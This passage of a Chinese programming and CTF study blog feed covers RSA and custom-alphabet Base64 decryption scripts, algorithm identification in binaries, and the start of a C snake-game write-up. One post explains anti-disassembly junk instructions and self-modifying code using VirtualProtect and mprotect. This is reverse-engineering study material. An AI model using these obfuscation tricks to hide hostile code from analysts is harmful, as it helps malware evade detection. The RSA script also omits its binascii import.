id="可能存在的超前的内容">可能存在的超前的内容</h2><p>因为本书主要从讲解思路作为切入点,所以一些代码片段可能还没有讲解,就放进来作为示例了.</p><p>所以本教程默认各位连着看下来,同时有较强的搜索能力和理解能力—实际上就是希望大家尽量学会去<code>猜---猜代码的用途</code>,你可能并不需要把某一行代码彻底理解,只要猜出来结果是干什么的就行.</p><p>例如:笔者会直接引入输入输出的两个函数—<code>scanf()和printf()</code>,此时,你应该做到无需关心这两个函数的原理和写法,如果我们有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a);</span><br></pre></td></tr></table></figure><p>读者应该只需要意识到这段代码用于给a输入一个整数,而无需关心这行代码的各个部分到底是为什么这么写.</p><p>同理,如果我们有:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a);</span><br></pre></td></tr></table></figure><p>读者应该只需要意识到这段代码用于输出a的值,也就是<code>3</code>,而无需关心这行代码的各个部分到底是为什么这么写.</p><p>同时,<code>int a=3;</code>读者可能不知道int是干什么的,但是看到a=3就应该意识到:<code>总之这行代码就是让一个变量a的值为3</code>.</p><p>其他同理,学习要学会去适当合理的猜测.</p><p><code>另外,所有&quot;超前&quot;的内容,后面一定会讲到!</code></p><br><p>那么，讲到现在，也算是发了一点牢骚—因为踩过坑，不想让其他人再踩.之后就正式开始写教程.</p><p align=right>---WAHAHA，2023.9.27</p><br><br><p>下一篇:<a href="../2023d1f77d78f8b6/">c语言教程-1-什么是程序</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA</title>
      <link href="/2023abcb05c55138/"/>
      <url>/2023abcb05c55138/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>RSA是目前使用最广泛的公钥密码体制之一。它是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>RSA算法的安全性基于RSA问题的困难性，也就是基于<code>大整数因子分解</code>的困难性上。但是RSA问题不会比因子分解问题更加困难，也就是说，在没有解决因子分解问题的情况下可能解决RSA问题，因此RSA算法并不是完全基于大整数因子分解的困难性上的。</p><p>注:RSA的相关证明涉及到中国剩余定理的利用</p><h1 id="算法描述">算法描述</h1><h2 id="rsa产生公私钥对">RSA产生公私钥对</h2><p>1.选取两个大素数 <code>p,q</code>,为了最大的安全性,p,q的位数相等</p><p>2.计算乘积 <code>n=p*q</code></p><p>3.随机取加密密钥 <code>e</code>,使得e和(p-1)(q-1)互素,然后使用欧几里得算法计算解密密钥<code>d</code></p><p>​一般情况下 <code>e</code> 取 <code>65537</code></p><p>​即有公式 <code>d = e^-1 mod (p-1)(q-1)</code></p><p>注意:</p><p>d和n也互素,至此,<code>e</code>和<code>n</code>为公钥,<code>d</code>为私钥</p><p>实际应用中，<code>e</code> 常常选择65537 (?)</p><h2 id="rsa的加解密算法">RSA的加解密算法</h2><p>设有明文<code>m</code>,密文为<code>c</code>,其中<code>0&lt;=m&lt;n,0&lt;=c&lt;n</code></p><p>则加密算法为:</p><p>​<code>c = m^e mod n</code></p><p>解密算法为:</p><p>​<code>m = c^d mod n</code></p><h1 id="rsa对明文的加解密的过程">RSA对明文的加解密的过程</h1><p>1.首先对于明文<code>M</code>,要对其进行比特串分组,确保每个分组<code>m</code>的十进制数都小于n(即<code>0&lt;=m&lt;n</code>)</p><p>2.然后对每个分组进行加密,整合为密文<code>C</code></p><p>3.对与密文<code>C</code>同理分组为<code>c</code>,有<code>0&lt;=c&lt;n</code></p><p>4.对其进行解密,最终整合为明文<code>M</code></p><h1 id="加解密脚本">加解密脚本</h1><p>CTF中,往往只会给出n,不可能直接给你p和q,当n较小时,我们使用<code>大数分解</code>在线网站等工具可以直接分解出p和q,此时加密即被破解.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知公私钥</span></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">6376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入密文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)  <span class="comment"># 即m = c^d mod n (求大整数c的d次幂模n取余)</span></span><br><span class="line"><span class="comment"># print(m)  # 求得的明文</span></span><br><span class="line">flag = <span class="built_in">str</span>(<span class="built_in">hex</span>(m))[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag).decode())</span><br><span class="line"><span class="comment"># print(binascii.unhexlify(flag))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果已知公私钥</span></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入明文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">c = gmpy2.powmod(m, e, n)  <span class="comment"># 即c = m^e mod n (求大整数m的e次幂模n取余)</span></span><br><span class="line"><span class="built_in">print</span>(c)  <span class="comment"># 求得的密文</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="常用网站">常用网站</h1><p>解析公钥文件: <a href="http://tool.chacuo.net/cryptrsakeyparse">http://tool.chacuo.net/cryptrsakeyparse</a></p><p>进制转换: <a href="http://www.hiencode.com/jinzhi.html">http://www.hiencode.com/jinzhi.html</a></p><p>n分解为p,q: <a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a>?</p>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Base64</title>
      <link href="/202318510efe0389/"/>
      <url>/202318510efe0389/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>(见https://blog.csdn.net/local_752/article/details/121970823)</p><p>Base64是一种用64个字符表示所有二进制数据的编码方式，通过将二进制数据每6位一组的方式重新组织，刚好可以使用0~9的数字、大小写字母以及“+”和“/”总共64个字符表示从<code>000000</code>到<code>111111</code>的64种状态</p><p>它实际上是一种“二进制到文本”的编码方法</p><p>Base64是一种用64个字符(这64个字符中包括大小写字母、数字、＋和／，还有用来补缺的特殊字符=)来表示任意二进制数据的方法。它是一种编码方式，而非加密方式。它通过将二进制数据转变为64个“可打印字符”，完成了数据在HTTP协议上的传输。通过将二进制数据每6位一组的方式重新组织，刚好可以使用0~9的数字、大小写字母以及“+”和“/”总共64个字符表示从<code>000000</code>到<code>111111</code>的64种状态</p><p>注意：由于base64编码用了8位字符来表示信息中的6个位，所以base64编码字符串大约比原始值扩大了33%。</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230917180421686.png" alt="image-20230917180421686"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230917180421686.png" alt=""></p><p>对于原文,取3个字符一组,共24bit,拆分成4块,每块6bit,然后各块最高位补2bit的0(共补8bit),扩展为4块8bit的组,每组由于高2位均为0,所以必然是合法的ASCII字符,并且共有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>6</mn></msup><mo>=</mo><mn>64</mn></mrow><annotation encoding="application/x-tex">2^6=64</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">6</span><span class="mord">4</span></span></span></span>种可能的字符.</p><p>根据Base64字母表,对扩展后的组用对应的4个字符进行替换,这样就实现了一组替换,同时3字节-&gt;4字节,长度有所增大.000000 000000 000000 000000</p><p>需要注意的是,如果最后剩余1字节,则需要在结果后面补2个<code>=</code>(因为单个的8bit只能分成2个块,后面的块要对低4位补0)进行补齐.</p><p>同理,如果最后剩余2字节,则需要在结果后面补1个<code>=</code>(因为2字节共16bit可以分成3个块,最后面的块要对低2位补0)进行补齐.</p><p>解码时,只需要按规则逆向拆分合并即可.</p><h1 id="变表base64">变表Base64</h1><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">original_title</span>():</span><br><span class="line">    <span class="comment"># 原来的题目</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;welcome to moectf\ninput your flag and I wiil check it:&#x27;</span>)</span><br><span class="line">    enc_flag = base64.b64encode(flag.encode()).decode()</span><br><span class="line">    enc_flag = enc_flag.translate(<span class="built_in">str</span>.maketrans(string2, string1))</span><br><span class="line">    <span class="keyword">if</span> enc_flag == str1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;good job!!!!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;something wrong???&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt1</span>():</span><br><span class="line">    <span class="comment"># 方法1</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">    convert_dict = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(string1)):</span><br><span class="line">        ch1 = string1[i]</span><br><span class="line">        ch2 = string2[i]</span><br><span class="line">        convert_dict[ch1] = ch2</span><br><span class="line"></span><br><span class="line">    str2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> convert_dict.keys():</span><br><span class="line">            str2 += i</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        j = convert_dict[i]</span><br><span class="line">        str2 += j</span><br><span class="line">    flag = base64.b64decode(str2.encode()).decode()</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>():</span><br><span class="line">    <span class="comment"># 方法2</span></span><br><span class="line">    str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    flag = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string2, string1)))</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt1()</span></span><br><span class="line">decrypt2()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 加密算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码保护和混淆</title>
      <link href="/2023d5932dc94d91/"/>
      <url>/2023d5932dc94d91/</url>
      
        <content type="html"><![CDATA[<h1 id="抵御静态分析">抵御静态分析</h1><p>对于二进制程序分析,工具都要先进行反汇编,所以要进行抵御,可以对汇编进行特殊处理来干扰工具的分析</p><h2 id="花指令">花指令</h2><h3 id="函数头处增加pushfd-popfd和nop指令">函数头处增加pushfd,popfd和nop指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">;常规的函数头</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br><span class="line"></span><br><span class="line">;加上花指令后</span><br><span class="line">push ebp</span><br><span class="line">pushfd</span><br><span class="line">add esp,0xd</span><br><span class="line">nop</span><br><span class="line">sub esp 0xd</span><br><span class="line">popfd</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br><span class="line"></span><br><span class="line">;pushfd和popfd等指令会混淆逆向工具的栈指针解析</span><br></pre></td></tr></table></figure><h3 id="插入脏字节并设置跳转">插入脏字节并设置跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jmp addr1 ;跳转到下面以保持正常的运行</span><br><span class="line">db 0xe8 ;脏字节,并且这个0xe8是call指令的起始字节,会让反汇编器认为这里是一条call指令</span><br><span class="line">addr1:</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><h3 id="条件跳转来干扰递归下降反汇编器">条件跳转来干扰递归下降反汇编器</h3><p>递归下降反汇编器虽然部分模拟了程序执行的控制流过程,但是并不是真正的运行,不能获取所有的信息,</p><p>利用这点插入条件跳转来让其反汇编所有的分支,这样就会导致0xe8被解析为指令,导致错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jz addr1</span><br><span class="line">jnz addr1 ;实际上是成为了无条件跳转</span><br><span class="line">db 0xe8</span><br><span class="line">addr1:</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><p>例题见<a href="../%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93">逆向做题总结</a></p><h3 id="同时将代码打乱顺序">同时将代码打乱顺序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">jz addr3</span><br><span class="line">jnz addr3 ;实际上是成为了无条件跳转</span><br><span class="line">db 0xe8</span><br><span class="line">addr3:</span><br><span class="line">sub esp,0x100</span><br><span class="line">...</span><br><span class="line">addr2:</span><br><span class="line">mov ebp,esp</span><br><span class="line">jmp addr3</span><br></pre></td></tr></table></figure><h3 id="指令替换">指令替换</h3><p>将一些指令替换为另一组相同或相似效果的指令来混淆,虽然程序效果没有变化,但是特殊的指令会让反汇编器出现错误</p><p>例如call,ret指令会让反汇编器解析出的函数地址范围和调用关系出现错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;call指令</span><br><span class="line">call addr</span><br><span class="line">;可替换为</span><br><span class="line">push addr</span><br><span class="line">ret</span><br><span class="line">;ret 进一步替换为(前提是ecx没有在使用)</span><br><span class="line">push ecx</span><br><span class="line">mov ecx,[esp+4]</span><br><span class="line">add esp,8</span><br><span class="line">jmp ecx</span><br></pre></td></tr></table></figure><h2 id="代码自修改-smc">代码自修改(SMC)</h2><p>SMC技术会对程序特定部分在运行时进行特定的处理,并被使用函数指针来作为代码直接调用,属于动态代码加密技术.</p><p>常见于壳类程序中,静态分析时IDA等工具会将处理前的部分解析为数据,导致错误.</p><p>SMC中会对.text中某块内存的属性进行修改,然后进行解密等操作,让该部分转换为实际可执行的指令.</p><p>修改属性常使用VirtualProtect()函数(windows中)和mprotect()函数(Linux中):</p><h3 id="virtualprotect">VirtualProtect()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Memoryapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">VirtualProtect</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPVOID lpAddress,</span></span><br><span class="line"><span class="params">  SIZE_T dwSize,</span></span><br><span class="line"><span class="params">  DWORD  flNewProtect,</span></span><br><span class="line"><span class="params">  PDWORD lpflOldProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li><code>lpAddress</code>:要改变属性的内存起始地址</li><li><code>dwSize</code>:要改变属性的内存区域大小</li><li><code>flAllocationType</code>:内存新的属性类型</li><li><code>lpflOldProtect</code>:内存原始属性类型保存地址</li></ul><p>常见的属性类型如下(SMC常用0x40):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240126232046604.png" alt="image-20240126232046604" style="zoom:50%;" /><h3 id="mprotect">mprotect()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><ul><li>该系统调用修改起始位置为<code>addr</code>,长度为<code>length</code>字节的虚拟内存区域中分页上的保护</li><li><code>addr</code>地址必须为分页大小的整数倍,<code>length</code>会被向上舍入到系统分页大小的下一个整数倍<ul><li><code>prot</code>参数是一个位掩码,常见值如下(值分别为1,2,7)</li></ul></li></ul><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240126232313960.png" alt="image-20240126232313960" style="zoom:50%;" /><h3 id="分析方法">分析方法</h3><h4 id="动调">动调</h4><p>下断点调试后,待SMC解密过程结束后,选中包括加密区域的整个函数代码,进行强制分析,然后F5就能得到正确的代码.(例题:[羊城杯 2021]BabySmc)</p><h2 id="加密">加密</h2><p>加密壳程序分为<code>数据加密,代码加密,算法加密</code></p><p>数据加密一般是在合适的时机对程序中已有的数据进行即时的解密</p><p>代码加密同理,例如SMC技术</p><p>算法加密偏重算法的混淆,模糊与隐藏,例如VM虚拟机保护</p><h1 id="反调试">反调试</h1><p>x64dbg和OD使用<code>SharpOD</code>反反调试插件来绕过反调试.</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见算法识别</title>
      <link href="/20234680fd9332b0/"/>
      <url>/20234680fd9332b0/</url>
      
        <content type="html"><![CDATA[<h1 id="特征值识别">特征值识别</h1><p>许多常见算法会使用一些常量,如AES,DES等,为了提高效率,常常被硬编码在程序中,所以可以通过识别这些常量来推测程序是否使用了该算法.</p><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/2183824-20210712212520283-1123075736.png" alt="img"></p><p>IDA中的FindCrypt插件,PEiD的KANAL可以查找特征值</p><h2 id="特征运算识别">特征运算识别</h2><p>特定的算法会有与之对应的运算,特征值不足以识别的时候,可以尝试分析程序中使用了那些特征运算,来进行算法的识别</p><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/2183824-20210712215155442-1406369467.png" alt="img"></p><h1 id="第三方库识别">第三方库识别</h1><h2 id="字符串识别">字符串识别</h2><p>许多第三方库都会将自己的版权信息,使用到的字符串(报错信息等)以字符串写入库,静态编译时,可以在二进制程序中找到这些信息,即可判断使用了哪些第三方库</p><h2 id="函数签名识别">函数签名识别</h2><p>库对应一系列函数,可通过特定的函数签名来识别具体的函数,可以使用IDA的签名识别功能来进行查找,同时若IDA没有预置需要识别的库函数签名,则可以上网查找需要的函数签名库进行导入,或者使用IDA SDK中提供的FLAIR工具,根据已有的静态库文件来生成一份签名</p><h2 id="二进制比对识别">二进制比对识别</h2><p>可以使用BinDiff工具来对二进制程序A(要分析的程序)和二进制程序B(自行找到的一个包含特定信息的程序)进行比较分析.</p><p>如果已知了A使用了某特定库,但是因为环境不同等原因不能完全匹配,这时可以找另外一个已经使用了该库的程序进行比对,来查看相似度,相似度达0.99的大概率是相同函数</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言贪吃蛇</title>
      <link href="/202379dbc5fa8424/"/>
      <url>/202379dbc5fa8424/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏说明">游戏说明</h1><p>本代码实现了Windows下(使用了Win API)基于c语言的控制台运行的贪吃蛇游戏.</p><p>代码开源至:<a href="https://github.com/gngtwhh/snake">https://github.com/gngtwhh/snake</a></p><p>代码行数: 537行</p><p>文件包括:<br>game.c 游戏运行逻辑支持<br>main.c 主函数控制<br>menu.c 菜单选择控制<br>snake.h 声明头文件<br>system.c 系统支持相关</p><p>细节描述:<br>实现菜单选择,游戏基本元素,自定义游戏设置,完善用户交互,处理用户错误输入</p><h1 id="实现效果">实现效果</h1><h2 id="主界面">主界面</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110606510.png" alt="image-20230908110606510"></p><h2 id="自定义">自定义</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110640008.png" alt="image-20230908110640008" style="zoom:33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110652950.png" alt="image-20230908110652950" style="zoom:33%;" /><h2 id="游戏开始">游戏开始</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110721287.png" alt="image-20230908110721287"></p><h2 id="结算界面">结算界面</h2><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230908110739259.png" alt="image-20230908110739259"></p><h1 id="代码详解">代码详解</h1><p>注:代码中一些函数进行了简化和适当的省略,主要为了体现代码的逻辑</p><h2 id="游戏数据结构-game-c">游戏数据结构—game.c</h2><p>使用一个双向链表来存储蛇,使用一个包含一个坐标对的结构体来存储苹果的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 以下在snake.h头文件中</span></span><br><span class="line"><span class="comment">#define bool int // 纯c语言,没有bool类型,需要宏定义bool类型</span></span><br><span class="line"><span 